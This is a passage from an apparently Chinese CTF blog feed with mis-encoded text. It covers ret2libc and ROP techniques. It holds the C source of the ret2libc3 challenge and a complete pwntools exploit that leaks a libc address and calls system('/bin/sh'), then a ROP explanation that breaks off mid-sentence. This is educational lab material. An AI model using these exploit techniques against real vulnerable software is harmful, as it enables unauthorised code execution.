        <content type="html"><![CDATA[<h1 id="Return2libc"><a href="#Return2libc" class="headerlink" title="Return2libc"></a>Return2libc</h1><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>Ret2libcï¼Œæ•…åæ€æ„ï¼Œreturn to libc,åœ¨PWNä¸­å³ï¼šä¿®æ”¹è¿”å›åœ°å€ä½¿å…¶æŒ‡å‘libcä¸­çš„shell</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.freebuf.com/news/182894.html" target="_blank" rel="noopener">https://www.freebuf.com/news/182894.html</a> </p><h2 id="0x10-Return2libc"><a href="#0x10-Return2libc" class="headerlink" title="0x10 Return2libc"></a>0x10 Return2libc</h2><p><em>ï¼ï¼ä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„æŸä¸ªå‡½æ•°</em></p><p>æ ¹æ®ä¸Šé¢å‰¯æ ‡é¢˜çš„è¯´æ˜ï¼Œè¦å®Œæˆçš„ä»»åŠ¡åŒ…æ‹¬ï¼šåœ¨å†…å­˜ä¸­ç¡®å®šæŸä¸ªå‡½æ•°çš„åœ°å€ï¼Œå¹¶ç”¨å…¶è¦†ç›–æ‰è¿”å›åœ°å€ã€‚ç”±äº libc åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°è¢«å¹¿æ³›ä½¿ç”¨ï¼Œæ‰€ä»¥æœ‰å¾ˆå¤§æ¦‚ç‡å¯ä»¥åœ¨å†…å­˜ä¸­æ‰¾åˆ°è¯¥åŠ¨æ€åº“ã€‚åŒæ—¶ç”±äºè¯¥åº“åŒ…å«äº†ä¸€äº›ç³»ç»Ÿçº§çš„å‡½æ•°ï¼ˆä¾‹å¦‚ system() ç­‰ï¼‰ï¼Œæ‰€ä»¥é€šå¸¸ä½¿ç”¨è¿™äº›ç³»ç»Ÿçº§å‡½æ•°æ¥è·å¾—å½“å‰è¿›ç¨‹çš„æ§åˆ¶æƒã€‚é‰´äºè¦æ‰§è¡Œçš„å‡½æ•°å¯èƒ½éœ€è¦å‚æ•°ï¼Œæ¯”å¦‚è°ƒç”¨ system() å‡½æ•°æ‰“å¼€ shell çš„å®Œæ•´å½¢å¼ä¸º system(â€œ/bin/shâ€) ï¼Œæ‰€ä»¥æº¢å‡ºæ•°æ®ä¹Ÿè¦åŒ…æ‹¬å¿…è¦çš„å‚æ•°ã€‚ä¸‹é¢å°±ä»¥æ‰§è¡Œ system(â€œ/bin/shâ€) ä¸ºä¾‹ï¼Œå…ˆå†™å‡ºæº¢å‡ºæ•°æ®çš„ç»„æˆï¼Œå†ç¡®å®šå¯¹åº”çš„å„éƒ¨åˆ†å¡«å……è¿›å»ã€‚</p><blockquote><p><strong>payload:</strong> padding1 + address of system() + padding2 + address of â€œ/bin/shâ€</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220145.png" alt=""></p><h2 id="0x20-return2libc-payload"><a href="#0x20-return2libc-payload" class="headerlink" title="0x20 return2libc  payload"></a>0x20 return2libc  payload</h2><p>padding1 å¤„çš„æ•°æ®å¯ä»¥éšæ„å¡«å……ï¼ˆæ³¨æ„ä¸è¦åŒ…å« â€œ\x00â€ ï¼Œå¦åˆ™å‘ç¨‹åºä¼ å…¥æº¢å‡ºæ•°æ®æ—¶ä¼šé€ æˆæˆªæ–­ï¼‰ï¼Œé•¿åº¦åº”è¯¥åˆšå¥½è¦†ç›–å‡½æ•°çš„åŸºåœ°å€ã€‚address of system() æ˜¯ system() åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œç”¨æ¥è¦†ç›–è¿”å›åœ°å€ã€‚padding2 å¤„çš„æ•°æ®é•¿åº¦ä¸º4ï¼ˆ32ä½æœºï¼‰ï¼Œå¯¹åº”è°ƒç”¨ system() æ—¶çš„è¿”å›åœ°å€ã€‚å› ä¸ºæˆ‘ä»¬åœ¨è¿™é‡Œåªéœ€è¦æ‰“å¼€ shell å°±å¯ä»¥ï¼Œå¹¶ä¸å…³å¿ƒä» shell é€€å‡ºä¹‹åçš„è¡Œä¸ºï¼Œæ‰€ä»¥ padding2 çš„å†…å®¹å¯ä»¥éšæ„å¡«å……ã€‚address of â€œ/bin/shâ€ æ˜¯å­—ç¬¦ä¸² â€œ/bin/shâ€ åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œä½œä¸ºä¼ ç»™ system() çš„å‚æ•°ã€‚</p><p>æ ¹æ®ä¸Šé¢çš„æ„é€ ï¼Œæˆ‘ä»¬è¦è§£å†³ä¸ªé—®é¢˜ã€‚</p><ol><li>è¿”å›åœ°å€ä¹‹å‰çš„å¡«å……æ•°æ®ï¼ˆpadding1ï¼‰åº”è¯¥å¤šé•¿ï¼Ÿ</li></ol><p>è§£å†³æ–¹æ³•å’Œ shellcode ä¸­æåˆ°çš„ç­”æ¡ˆä¸€æ ·ã€‚</p><ol><li>system() å‡½æ•°åœ°å€åº”è¯¥æ˜¯å¤šå°‘ï¼Ÿ</li></ol><p>è¦å›ç­”è¿™ä¸ªé—®é¢˜ï¼Œå°±è¦çœ‹çœ‹ç¨‹åºæ˜¯å¦‚ä½•è°ƒç”¨åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°çš„ã€‚å½“å‡½æ•°è¢«åŠ¨æ€é“¾æ¥è‡³ç¨‹åºä¸­ï¼Œç¨‹åºåœ¨è¿è¡Œæ—¶é¦–å…ˆç¡®å®šåŠ¨æ€é“¾æ¥åº“åœ¨å†…å­˜çš„èµ·å§‹åœ°å€ï¼Œå†åŠ ä¸Šå‡½æ•°åœ¨åŠ¨æ€åº“ä¸­çš„ç›¸å¯¹åç§»é‡ï¼Œæœ€ç»ˆå¾—åˆ°å‡½æ•°åœ¨å†…å­˜çš„ç»å¯¹åœ°å€ã€‚è¯´åˆ°ç¡®å®šåŠ¨æ€åº“çš„å†…å­˜åœ°å€ï¼Œå°±è¦å›é¡¾ä¸€ä¸‹ shellcode ä¸­æåˆ°çš„å†…å­˜å¸ƒå±€éšæœºåŒ–ï¼ˆASLRï¼‰ï¼Œè¿™é¡¹æŠ€æœ¯ä¹Ÿä¼šå°†åŠ¨æ€åº“åŠ è½½çš„èµ·å§‹åœ°å€åšéšæœºåŒ–å¤„ç†ã€‚æ‰€ä»¥ï¼Œå¦‚æœæ“ä½œç³»ç»Ÿæ‰“å¼€äº† ASLRï¼Œç¨‹åºæ¯æ¬¡è¿è¡Œæ—¶åŠ¨æ€åº“çš„èµ·å§‹åœ°å€éƒ½ä¼šå˜åŒ–ï¼Œä¹Ÿå°±æ— ä»ç¡®å®šåº“å†…å‡½æ•°çš„ç»å¯¹åœ°å€ã€‚åœ¨ ASLR è¢«å…³é—­çš„å‰æä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒè¯•å·¥å…·åœ¨è¿è¡Œç¨‹åºè¿‡ç¨‹ä¸­ç›´æ¥æŸ¥çœ‹ system() çš„åœ°å€ï¼Œä¹Ÿå¯ä»¥æŸ¥çœ‹åŠ¨æ€åº“åœ¨å†…å­˜çš„èµ·å§‹åœ°å€ï¼Œå†åœ¨åŠ¨æ€åº“å†…æŸ¥çœ‹å‡½æ•°çš„ç›¸å¯¹åç§»ä½ç½®ï¼Œé€šè¿‡è®¡ç®—å¾—åˆ°å‡½æ•°çš„ç»å¯¹åœ°å€ã€‚</p><p>æœ€åï¼Œâ€œ/bin/shâ€ çš„åœ°å€åœ¨å“ªé‡Œï¼Ÿ</p><p>å¯ä»¥åœ¨åŠ¨æ€åº“é‡Œæœç´¢è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœå­˜åœ¨ï¼Œå°±å¯ä»¥æŒ‰ç…§åŠ¨æ€åº“èµ·å§‹åœ°å€ï¼‹ç›¸å¯¹åç§»æ¥ç¡®å®šå…¶ç»å¯¹åœ°å€ã€‚å¦‚æœåœ¨åŠ¨æ€åº“é‡Œæ‰¾ä¸åˆ°ï¼Œå¯ä»¥å°†è¿™ä¸ªå­—ç¬¦ä¸²åŠ åˆ°ç¯å¢ƒå˜é‡é‡Œï¼Œå†é€šè¿‡ getenv() ç­‰å‡½æ•°æ¥ç¡®å®šåœ°å€ã€‚</p><p>è§£å†³å®Œä¸Šè¿°é—®é¢˜ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‹¼æ¥å‡ºæº¢å‡ºæ•°æ®ï¼Œè¾“å…¥è‡³ç¨‹åºæ¥é€šè¿‡ system() æ‰“å¼€ shell äº†ã€‚</p><h2 id="0x30-example"><a href="#0x30-example" class="headerlink" title="0x30 example"></a>0x30 example</h2><p>æœ¬é¢˜è¿˜æ˜¯æ¥æºäºctf-wiki/challengesä¸­çš„ä¸€é“pwné¢˜ç›®ï¼šret2libc3</p><p>ç¨‹åºæºä»£ç ï¼š</p><pre class=" language-lang-c"><code class="language-lang-c">#include <stdio.h>#include <stdlib.h>#include <time.h>char buf2[100];void secure(void){    int secretcode, input;    srand(time(NULL));    secretcode = rand();    scanf("%d", &amp;input);    if(input == secretcode)        puts("no_shell_QQ");}int main(void){    setvbuf(stdout, 0LL, 2, 0LL);    setvbuf(stdin, 0LL, 1, 0LL);    char buf1[100];    printf("No surprise anymore, system disappeard QQ.\n");    printf("Can you find it !?");    gets(buf1);    return 0;}</time.h></stdlib.h></stdio.h></code></pre><p>ç¨‹åºå¼€å¯NXä¿æŠ¤ï¼Œæœªå¼€å¯æ ˆä¿æŠ¤ä¸PIEï¼ˆåœ°å€éšæœºåŒ–ï¼‰</p><p>fileå±æ€§</p><pre class=" language-lang-txt"><code class="language-lang-txt">ret2libc3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=c0ad441ebd58b907740c1919460c37bb99bb65df, not stripped</code></pre><p>ä¹Ÿå°±æ˜¯è¯´æ ˆä¸­çš„æ•°æ®å˜å¾—ä¸å¯æ‰§è¡Œï¼Œæˆ‘ä»¬ä¸èƒ½é€šè¿‡å¡«å……shellcodeåˆ°æ ˆé‡Œæ¥æº¢å‡º</p><blockquote><p>é‚£æˆ‘ä»¬æ€ä¹ˆæ‰èƒ½pwnæ‰è¿™ä¸ªç¨‹åºå‘¢</p></blockquote><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦äº†è§£ç¨‹åºçš„POTè¡¨ä¸GOTè¡¨ï¼ŒåŠ¨æ€é“¾æ¥åº“ï¼Œé™æ€é“¾æ¥æ–‡ä»¶ï¼Œç­‰è¿™äº›æ¦‚å¿µ</p><p>æˆ‘æŠŠè¿™äº›æ•´ç†åˆ°å¦ä¸€ç¯‡åšå®¢é‡Œé¢äº†ï¼Œ</p><p>ä¹Ÿå¯ä»¥çœ‹è¿™ç¯‡åšå®¢ï¼Œæˆ‘é‚£ç¯‡ELFæ–‡ä»¶åŸºç¡€ä¹Ÿæ˜¯ä½¿ç”¨äº†ä»–çš„éƒ¨åˆ†å†…å®¹</p><p><a href="https://www.freebuf.com/news/182894.html" target="_blank" rel="noopener">https://www.freebuf.com/news/182894.html</a></p><p>å›åˆ°æœ¬é¢˜</p><p>ä¸ç®€å•çš„pwné¢˜ä¸åŒçš„æ˜¯ï¼Œè¿™é“é¢˜æ²¡æœ‰æä¾›system()å‡½æ•°ï¼Œä½†æˆ‘ä»¬è¦è°ƒç”¨system(â€œbin/shâ€)ï¼Œæ‰èƒ½è·å–åˆ°shell</p><p>å¹¶ä¸”ç¨‹åºå¼€å¯äº†NXä¿æŠ¤ï¼Œæˆ‘ä»¬ä¸èƒ½é€šè¿‡å¡«å……Shellcodeçš„æ–¹å¼æ¥è·å–shell,</p><p>ä½†é€šè¿‡æˆ‘ä»¬å‰é¢äº†è§£åˆ°çš„çŸ¥è¯†ï¼Œ</p><pre class=" language-lang-txt"><code class="language-lang-txt">å› ä¸ºç¨‹åºæ˜¯åŠ¨æ€é“¾æ¥ç”Ÿæˆçš„ï¼Œæ‰€ä»¥åœ¨ç¨‹åºè¿è¡Œæ—¶ä¼šè°ƒç”¨ libc.so (ç¨‹åºè¢«è£…è½½æ—¶ï¼ŒåŠ¨æ€é“¾æ¥å™¨ä¼šå°†ç¨‹åºæ‰€æœ‰æ‰€éœ€çš„åŠ¨æ€é“¾æ¥åº“åŠ è½½è‡³è¿›ç¨‹ç©ºé—´ï¼Œlibc.so å°±æ˜¯å…¶ä¸­æœ€åŸºæœ¬çš„ä¸€ä¸ª)ï¼Œlibc.so æ˜¯ linux ä¸‹ C è¯­è¨€åº“ä¸­çš„è¿è¡Œåº“glibc çš„åŠ¨æ€é“¾æ¥ç‰ˆï¼Œå¹¶ä¸” libc.so ä¸­åŒ…å«äº†å¤§é‡çš„å¯ä»¥åˆ©ç”¨çš„å‡½æ•°ï¼ŒåŒ…æ‹¬ system() ã€execve() ç­‰ç³»ç»Ÿçº§å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰¾åˆ°è¿™äº›å‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€è¦†ç›–æ‰è¿”å›åœ°å€æ¥è·å¾—å½“å‰è¿›ç¨‹çš„æ§åˆ¶æƒï¼Œè€Œlibc.soåŠ¨æ€é“¾æ¥åº“é‡Œçš„å‡½æ•°çš„åç§»æ˜¯å›ºå®šçš„</code></pre><p>è¿˜æœ‰æ–‡ä»¶å±æ€§ <strong>dynamically linked</strong> </p><p>æ‰€ä»¥è¦è§£å†³è¿™é“é¢˜æˆ‘ä»¬å°±è¦ç”¨åˆ°ret2libcçš„æ–¹æ³•äº†</p><p>å…ˆè¯´è¯´è¿™é“é¢˜çš„åˆ©ç”¨æ€è·¯</p><ol><li>ç¨‹åºæä¾›äº†puts()å‡½æ•°ï¼Œåˆ©ç”¨putså‡½æ•°æˆ‘ä»¬å¯ä»¥æ³„éœ²å‡ºputså‡½æ•°åœ¨GOTè¡¨ä¸­çš„åœ°å€ï¼Œæˆ–è€…å…¶ä»–å‡½æ•°ä¹Ÿè¡Œï¼ˆç¨‹åºé‡Œï¼‰</li><li>å¾—åˆ°putså‡½æ•°åœ¨GOTè¡¨ä¸­çš„åœ°å€ä»¥åï¼Œæˆ‘ä»¬å°±å¯ä»¥æ ¹æ®åœ°å€çš„åä¸‰ä½æ¥åˆ¤æ–­å‡ºlibcçš„ç‰ˆæœ¬å·ï¼Œï¼ˆåä¸‰ä½åœ°å€æ˜¯ä¸å˜çš„ï¼Œæ— è®ºæ€ä¹ˆåç§»ï¼‰</li><li>åˆ©ç”¨æ³„éœ²å‡ºæ¥çš„puts()å‡½æ•°çš„åœ°å€-libcä¸­puts()çš„åç§»é‡=libcåŸºç¡€åœ°å€ï¼ˆç®—å‡ºlibcåŸºç¡€åœ°å€ï¼‰</li><li>systemåœ¨libcä¸­çš„åç§»+libcçš„åŸºç¡€åœ°å€=systemåœ¨ç¨‹åºä¸­çš„ä½ç½®</li><li>â€˜/bin/shâ€™çš„åœ°å€åŒç†æ¨å‡º</li></ol><p>payload:</p><pre class=" language-lang-txt"><code class="language-lang-txt">#æ³„éœ²GOTè¡¨#payload= 'a'*offset + elf.plt['puts'] + returnaddr + elf.got['puts']payload=flat(['a'*112 , p32(elf.plt['puts']), p32(elf.symbols['main']) , p32(elf.got['puts'])])#putsåœ¨GOTè¡¨ä¸­çš„åœ°å€#æ¥æ”¶4ä¸ªå­—èŠ‚puts_addr = u32(p.recv()[0:4])libc_base=puts_addr-libc.symbols['puts']system_addr=libc_base+libc.symbols['system']bin_addr=libc.base + libc.search('/bin/sh').next()payload='a'*offset +system_addr + returnaddr + bin_addr#payload=flat(['a*104',system_addr, 'bbbb',bin_addr])</code></pre><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *elf = ELF('./ret2libc3')sh  = process('./ret2libc3')libc=ELF('./libc6_2.23-0ubuntu10_i386.so')#è¿”å›åˆ°mainå‡½æ•°åœ¨æ‰§è¡Œä¸€æ¬¡mainå‡½æ•°payload=flat(['a'*112 , p32(elf.plt['puts']), p32(elf.symbols['main']) , p32(elf.got['puts'])])sh.sendlineafter('Can you find it !?', payload)puts_addr = u32(sh.recv()[0:4])libc_base=puts_addr-libc.symbols['puts']system_addr=libc_base+libc.symbols['system']bin_addr=libc_base + libc.search('/bin/sh').next()payload=flat(['a'*104, system_addr, 0x12345678 ,bin_addr])sh.sendline(payload)sh.interactive()</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PwnåŸºç¡€----ROP</title>
      <link href="/2020/02/18/ctf/pwn/pwn-rop/"/>
      <url>/2020/02/18/ctf/pwn/pwn-rop/</url>
      
        <content type="html"><![CDATA[<h1 id="ROP-Return-Oriented-Programming"><a href="#ROP-Return-Oriented-Programming" class="headerlink" title="ROP  (Return Oriented Programming)"></a>ROP  (Return Oriented Programming)</h1><h2 id="0x00-ROP"><a href="#0x00-ROP" class="headerlink" title="0x00 ROP"></a>0x00 ROP</h2><p><em>ï¼ï¼ä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„ä¸€æ®µæŒ‡ä»¤</em></p><p>æ ¹æ®ä¸Šé¢å‰¯æ ‡é¢˜çš„è¯´æ˜ï¼Œè¦å®Œæˆçš„ä»»åŠ¡åŒ…æ‹¬ï¼šåœ¨å†…å­˜ä¸­ç¡®å®šæŸæ®µæŒ‡ä»¤çš„åœ°å€ï¼Œå¹¶ç”¨å…¶è¦†ç›–è¿”å›åœ°å€ã€‚å¯æ˜¯æ—¢ç„¶å¯ä»¥è¦†ç›–è¿”å›åœ°å€å¹¶å®šä½åˆ°å†…å­˜åœ°å€ï¼Œä¸ºä»€ä¹ˆä¸ç›´æ¥ç”¨ä¸Šç¯‡æåˆ°çš„ return2libc å‘¢ï¼Ÿå› ä¸ºæœ‰æ—¶ç›®æ ‡å‡½æ•°åœ¨å†…å­˜å†…æ— æ³•æ‰¾åˆ°ï¼Œæœ‰æ—¶ç›®æ ‡æ“ä½œå¹¶æ²¡æœ‰ç‰¹å®šçš„å‡½æ•°å¯ä»¥å®Œç¾é€‚é…ã€‚è¿™æ—¶å°±éœ€è¦åœ¨å†…å­˜ä¸­å¯»æ‰¾å¤šä¸ªæŒ‡ä»¤ç‰‡æ®µï¼Œæ‹¼å‡‘å‡ºä¸€ç³»åˆ—æ“ä½œæ¥è¾¾æˆç›®çš„ã€‚å‡å¦‚è¦æ‰§è¡ŒæŸæ®µæŒ‡ä»¤ï¼ˆæˆ‘ä»¬å°†å…¶ç§°ä¸ºâ€œgadgetâ€ï¼Œæ„ä¸ºå°å·¥å…·ï¼‰ï¼Œæº¢å‡ºæ•°æ®åº”è¯¥ä»¥ä¸‹é¢çš„æ–¹å¼æ„é€ ï¼š</p><blockquote><p><strong>payload :</strong> <em>padding + address of gadget</em></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220132.png" alt=""></p><h2 id="0x10-åŒ…å«å•ä¸ª-gadget-çš„æº¢å‡ºæ•°æ®"><a href="#0x10-åŒ…å«å•ä¸ª-gadget-çš„æº¢å‡ºæ•°æ®" class="headerlink" title="0x10 åŒ…å«å•ä¸ª gadget çš„æº¢å‡ºæ•°æ®"></a>0x10 åŒ…å«å•ä¸ª gadget çš„æº¢å‡ºæ•°æ®</h2><p>å¦‚æœæƒ³è¿ç»­æ‰§è¡Œè‹¥å¹²æ®µæŒ‡ä»¤ï¼Œå°±éœ€è¦æ¯ä¸ª gadget æ‰§è¡Œå®Œæ¯•å¯ä»¥å°†æ§åˆ¶æƒäº¤ç»™ä¸‹ä¸€ä¸ª gadgetã€‚æ‰€ä»¥ gadget çš„æœ€åä¸€æ­¥åº”è¯¥æ˜¯ RET æŒ‡ä»¤ï¼Œè¿™æ ·ç¨‹åºçš„æ§åˆ¶æƒï¼ˆeipï¼‰æ‰èƒ½å¾—åˆ°åˆ‡æ¢ï¼Œæ‰€ä»¥è¿™ç§æŠ€æœ¯è¢«ç§°ä¸ºè¿”å›å¯¼å‘ç¼–ç¨‹( <strong>R</strong>eturn <strong>O</strong>riented <strong>P</strong>rogramming )ã€‚è¦æ‰§è¡Œå¤šä¸ª gadgetï¼Œæº¢å‡ºæ•°æ®åº”è¯¥ä»¥ä¸‹é¢çš„æ–¹å¼æ„é€ ï¼š</p><blockquote><p><strong>payload :</strong> padding + address of gadget 1 + address of gadget 2 + â€¦â€¦ + address of gadget n</p></blockquote><p>åœ¨è¿™æ ·çš„æ„é€ ä¸‹ï¼Œè¢«è°ƒç”¨å‡½æ•°è¿”å›æ—¶ä¼šè·³è½¬æ‰§è¡Œ gadget 1ï¼Œæ‰§è¡Œå®Œæ¯•æ—¶ gadget 1 çš„ RET æŒ‡ä»¤ä¼šå°†æ­¤æ—¶çš„æ ˆé¡¶æ•°æ®ï¼ˆä¹Ÿå°±æ˜¯ gadget 2 çš„åœ°å€ï¼‰å¼¹å‡ºè‡³ eipï¼Œç¨‹åºç»§ç»­è·³è½¬æ‰§è¡Œ gadget 2ï¼Œä»¥æ­¤ç±»æ¨ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220143.png" alt=""></p><h2 id="0x20-åŒ…å«å¤šä¸ª-gadget-çš„æº¢å‡ºæ•°æ®"><a href="#0x20-åŒ…å«å¤šä¸ª-gadget-çš„æº¢å‡ºæ•°æ®" class="headerlink" title="0x20 åŒ…å«å¤šä¸ª gadget çš„æº¢å‡ºæ•°æ®"></a>0x20 åŒ…å«å¤šä¸ª gadget çš„æº¢å‡ºæ•°æ®</h2><p>ç°åœ¨ä»»åŠ¡å¯ä»¥åˆ†è§£ä¸ºï¼šé’ˆå¯¹ç¨‹åºæ ˆæº¢å‡ºæ‰€è¦å®ç°çš„æ•ˆæœï¼Œæ‰¾åˆ°è‹¥å¹²æ®µä»¥ ret ä½œä¸ºç»“æŸçš„æŒ‡ä»¤ç‰‡æ®µï¼ŒæŒ‰ç…§ä¸Šè¿°çš„æ„é€ å°†å®ƒä»¬çš„åœ°å€å¡«å……åˆ°æº¢å‡ºæ•°æ®ä¸­ã€‚æ‰€ä»¥æˆ‘ä»¬è¦è§£å†³ä»¥ä¸‹å‡ ä¸ªé—®é¢˜ã€‚</p><p>é¦–å…ˆï¼Œæ ˆæº¢å‡ºä¹‹åè¦å®ç°ä»€ä¹ˆæ•ˆæœï¼Ÿ</p><p>ROP å¸¸è§çš„æ‹¼å‡‘æ•ˆæœæ˜¯å®ç°ä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨ï¼ŒLinuxç³»ç»Ÿä¸‹å¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤æ˜¯ int 0x80ã€‚æ‰§è¡Œè¿™æ¡æŒ‡ä»¤æ—¶ï¼Œè¢«è°ƒç”¨å‡½æ•°çš„ç¼–å·åº”å­˜å…¥ eaxï¼Œè°ƒç”¨å‚æ•°åº”æŒ‰é¡ºåºå­˜å…¥ ebxï¼Œecxï¼Œedxï¼Œesiï¼Œedi ä¸­ã€‚ä¾‹å¦‚ï¼Œç¼–å·125å¯¹åº”å‡½æ•°</p><pre class=" language-lang-txt"><code class="language-lang-txt">mprotect (void *addr, size_t len, int prot)</code></pre><p>ï¼Œå¯ç”¨è¯¥å‡½æ•°å°†æ ˆçš„å±æ€§æ”¹ä¸ºå¯æ‰§è¡Œï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç”¨ shellcode äº†ã€‚å‡å¦‚æˆ‘ä»¬æƒ³åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨æ‰§è¡Œè¿™ä¸ªå‡½æ•°ï¼Œeaxã€ebxã€ecxã€edx åº”è¯¥åˆ†åˆ«ä¸ºâ€œ125â€ã€å†…å­˜æ ˆçš„åˆ†æ®µåœ°å€ï¼ˆå¯ä»¥é€šè¿‡è°ƒè¯•å·¥å…·ç¡®å®šï¼‰ã€â€œ0x10000â€ï¼ˆéœ€è¦ä¿®æ”¹çš„ç©ºé—´é•¿åº¦ï¼Œä¹Ÿè®¸éœ€è¦æ›´é•¿ï¼‰ã€â€œ7â€ï¼ˆRWX æƒé™ï¼‰ã€‚</p><p>å…¶æ¬¡ï¼Œå¦‚ä½•å¯»æ‰¾å¯¹åº”çš„æŒ‡ä»¤ç‰‡æ®µï¼Ÿ</p><p>æœ‰è‹¥å¹²å¼€æºå·¥å…·å¯ä»¥å®ç°æœç´¢ä»¥ ret ç»“å°¾çš„æŒ‡ä»¤ç‰‡æ®µï¼Œè‘—åçš„åŒ…æ‹¬ <strong>ROPgadget</strong>ã€<strong>rp++</strong>ã€<strong>ropeme</strong> ç­‰ï¼Œç”šè‡³ä¹Ÿå¯ä»¥ç”¨ grep ç­‰æ–‡æœ¬åŒ¹é…å·¥å…·åœ¨æ±‡ç¼–æŒ‡ä»¤ä¸­æœç´¢ ret å†è¿›ä¸€æ­¥ç­›é€‰ã€‚æœç´¢çš„è¯¦ç»†è¿‡ç¨‹åœ¨è¿™é‡Œå°±ä¸å†èµ˜è¿°ï¼Œæœ‰å…´è¶£çš„åŒå­¦å¯ä»¥å‚è€ƒä¸Šè¿°å·¥å…·çš„è¯´æ˜æ–‡æ¡£ã€‚</p><p>æœ€åï¼Œå¦‚ä½•ä¼ å…¥ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°ï¼Ÿ</p><p>å¯¹äºä¸Šé¢æåˆ°çš„ mprotect å‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦å°†å‚æ•°ä¼ è¾“è‡³å¯„å­˜å™¨ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ pop æŒ‡ä»¤å°†æ ˆé¡¶æ•°æ®å¼¹å…¥å¯„å­˜å™¨ã€‚å¦‚æœåœ¨å†…å­˜ä¸­èƒ½æ‰¾åˆ°ç›´æ¥å¯ç”¨çš„æ•°æ®ï¼Œä¹Ÿå¯ä»¥ç”¨ mov æŒ‡ä»¤æ¥è¿›è¡Œä¼ è¾“ï¼Œä¸è¿‡å†™å…¥æ•°æ®å† pop è¦æ¯”å…ˆæœç´¢å† mov æ¥çš„ç®€å•ï¼Œå¯¹å§ï¼Ÿå¦‚æœè¦ç”¨ pop æŒ‡ä»¤æ¥ä¼ è¾“è°ƒç”¨å‚æ•°ï¼Œå°±éœ€è¦åœ¨æº¢å‡ºæ•°æ®å†…åŒ…å«è¿™äº›å‚æ•°ï¼Œæ‰€ä»¥ä¸Šé¢çš„æº¢å‡ºæ•°æ®æ ¼å¼éœ€è¦ä¸€ç‚¹ä¿®æ”¹ã€‚å¯¹äºå•ä¸ª gadgetï¼Œpop æ‰€ä¼ è¾“çš„æ•°æ®åº”è¯¥åœ¨ gadget åœ°å€ä¹‹åï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220134.png" alt=""></p><h2 id="0x30-gadget-â€œpop-eax-ret-â€"><a href="#0x30-gadget-â€œpop-eax-ret-â€" class="headerlink" title="0x30 gadget â€œpop eax; ret;â€"></a>0x30 gadget â€œpop eax; ret;â€</h2><p>åœ¨è°ƒç”¨ mprotect() ä¸ºæ ˆå¼€å¯å¯æ‰§è¡Œæƒé™ä¹‹åï¼Œæˆ‘ä»¬å¸Œæœ›æ‰§è¡Œä¸€æ®µ shellcodeï¼Œæ‰€ä»¥è¦å°† shellcode ä¹ŸåŠ å…¥æº¢å‡ºæ•°æ®ï¼Œå¹¶å°† shellcode çš„å¼€å§‹åœ°å€åŠ åˆ° int 0x80 çš„ gadgetä¹‹åã€‚ä½†ç¡®å®š shellcode åœ¨å†…å­˜çš„ç¡®åˆ‡åœ°å€æ˜¯å¾ˆå›°éš¾çš„äº‹ï¼ˆæƒ³èµ·ä¸Šç¯‡é‡Œé¢è‰°éš¾è¯•æ¢çš„è¿‡ç¨‹äº†å—ï¼Ÿï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ push esp è¿™ä¸ª gadgetï¼ˆåŠ å…¥å¯ä»¥æ‰¾åˆ°çš„è¯ï¼‰ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220133.png" alt=""></p><h2 id="0x40-gadget-â€œpush-esp-ret-â€"><a href="#0x40-gadget-â€œpush-esp-ret-â€" class="headerlink" title="0x40 gadget â€œpush esp; ret;â€"></a>0x40 gadget â€œpush esp; ret;â€</h2><p>æˆ‘ä»¬å‡è®¾ç°åœ¨å†…å­˜ä¸­å¯ä»¥æ‰¾åˆ°å¦‚ä¸‹å‡ æ¡æŒ‡ä»¤ï¼š</p><pre class=" language-lang-txt"><code class="language-lang-txt">pop eax; ret;    # pop stack top into eaxpop ebx; ret;    # pop stack top into ebxpop ecx; ret;    # pop stack top into ecxpop edx; ret;    # pop stack top into edxint 0x80; ret;   # system callpush esp; ret;   # push address of shellcode</code></pre><p>å¯¹äºæ‰€æœ‰åŒ…å« pop 